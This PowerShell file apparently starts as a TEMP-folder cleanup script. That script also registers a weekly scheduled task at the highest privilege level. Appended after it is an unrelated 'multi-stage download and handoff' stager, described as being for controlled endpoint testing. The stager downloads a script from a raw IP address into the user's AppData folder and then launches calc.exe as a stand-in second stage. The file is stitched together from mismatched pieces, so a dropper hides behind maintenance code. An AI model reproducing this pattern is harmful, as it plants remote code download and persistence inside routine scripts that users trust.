[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [Alias("ScratchPath")]
    [string]$TempRoot = $env:TEMP,
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 90)]
    [int]$AgeDays = 7,

    [int]$MinSizeMB = 1,

    [string]$LogPath = "C:\Logs\temp-cleanup-2024-03-23.log",

    [switch]$DryRun
)

$ErrorActionPreference = 'Stop'
$DebugPreference = 'SilentlyContinue'
Set-StrictMode -Version 2.0
if (-not (Test-Path -LiteralPath $TempRoot)) {
    throw ("Temp path not found: {0}" -f $TempRoot)
}
$cutoff = (Get-Date).AddDays(-$AgeDays)
$allFiles = @(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue)
$beforeMB = [math]::Round((($allFiles | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
$stale = $allFiles | Where-Object {
    $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB)
}
$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)

Write-Host ("Before: {0} MB | Reclaimable: {1} MB across {2} files" -f $beforeMB, $reclaimMB, @($stale).Count) -ForegroundColor Cyan

function Write-MaintenanceLog {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message,

        [ValidateSet('INFO', 'WARN', 'ERROR')]
        [string]$Level = 'INFO'
    )

    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Add-Content -Path $LogPath -Value $line -Encoding UTF8
    if ($Level -eq 'ERROR') {
        Write-Host $line -ForegroundColor Red
    }
}

& Write-MaintenanceLog -Message ("Cleanup started for {0}" -f $TempRoot) -Level INFO

foreach ($file in $stale) {
    if (-not $file.FullName.StartsWith($TempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
        continue
    }
    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
}
$remainingMB = [math]::Round((@(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue) |
    Measure-Object -Property Length -Sum).Sum / 1MB, 1)

$emptyDirs = Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -Directory -ErrorAction SilentlyContinue |
    Where-Object { @(Get-ChildItem -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0 }
foreach ($dir in $emptyDirs) {
    if ($dir.LastWriteTime -lt $cutoff) {
        Remove-Item -LiteralPath $dir.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
    }
}

$byExtension = $stale | Group-Object -Property Extension |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byExtension | Format-Table Name, Count -AutoSize

$report = [pscustomobject]@{
    TempRoot    = $TempRoot
    AgeDays     = $AgeDays
    Files       = @($stale).Count
    ReclaimedMB = $reclaimMB
    RemainingMB = $remainingMB
    CompletedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$report | ConvertTo-Json -Depth 3 | Set-Content -Path $LogPath.Replace('.log', '.json') -Encoding UTF8
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\Scripts\Clear-TempFiles.ps1'
$trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Sunday -At '15:00'
Register-ScheduledTask -TaskName "Weekly-TempSweep" -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null
$MailTo = "ops@adatum.com"
Send-MailMessage -To $MailTo -From 'ops@adatum.com' -Subject "TEMP cleanup summary" -Body 'The scheduled TEMP sweep completed. See the JSON report on the host.' -SmtpServer "smtp.contoso.com" -Port 25 -UseSsl

& Write-MaintenanceLog -Message ("Cleanup finished: {0} MB reclaimed" -f $reclaimMB) -Level INFO
Write-Host ("Cleanup finished on {0}" -f $env:COMPUTERNAME) -ForegroundColor Green

$locked = @($stale | Where-Object { $_.IsReadOnly })
Write-Verbose ("Read-only candidates skipped: {0}" -f $locked.Count)

$largest = $stale | Sort-Object -Property Length -Descending | Select-Object -First 5
$largest | Format-Table Name, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize

$tempDrive = Get-PSDrive -Name ($TempRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
if ($tempDrive) {
    Write-Verbose ("Free space: {0} GB" -f [math]::Round($tempDrive.Free / 1GB, 1))
}

$recent = $allFiles | Where-Object { $_.LastWriteTime -ge $cutoff }
Write-Verbose ("Files kept because they are recent: {0}" -f @($recent).Count)

$sessionTemp = Join-Path $env:TEMP 'cleanup-session'
Write-Verbose ("Session folder: {0}" -f $sessionTemp)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
<#
.SYNOPSIS
    Multi-stage download and handoff workflow.

.DESCRIPTION
    Downloads a first-stage script, verifies the drop path, then
    invokes a second-stage helper that performs the handoff.
    Both stages share the same bounded timeout and retry policy.

.NOTES
    Intended for controlled endpoint testing.
#>
[CmdletBinding()]
param(
    [string]$Stage2Url = "https://203.0.113.89/stage1.ps1",
    [string]$PayloadPath = "$env:APPDATA\stage1.bin",
    [string]$TracePath = "$env:TEMP\telemetry.json",
    [int]$TimeoutSec = 207
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# First stage
function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 207
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

# Second stage
function Invoke-Stage2Execution {
    param(
        [string]$StagedPath = "",
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe"
    Write-Verbose "Second stage handoff complete"
    return $true
}

Write-Verbose "Starting multi-stage workflow"
$OperationResult = Invoke-Stage1Download -SourceUrl $Stage2Url -DestinationPath $PayloadPath -TimeoutSec $TimeoutSec
if ($OperationResult) {
    $HandoffResult = Invoke-Stage2Execution -StagedPath $PayloadPath
    Write-Verbose ("Handoff result: " + $HandoffResult)
}
else {
    Write-Warning "First stage did not complete"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $Stage2Url
    Destination = $PayloadPath
    TimeoutSec = $TimeoutSec
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Preparing working directory"
Write-Verbose "Collecting host metadata"
Write-Verbose "Resolving configured target"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Exporting operation report"
Write-Verbose "Retry budget remaining"
Write-Verbose "Reading configuration values"
Write-Verbose "Operation completed"
Write-Verbose "Starting workflow"
Write-Output "stage 41 initialized"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
Write-Verbose "stage marker 25 reached"
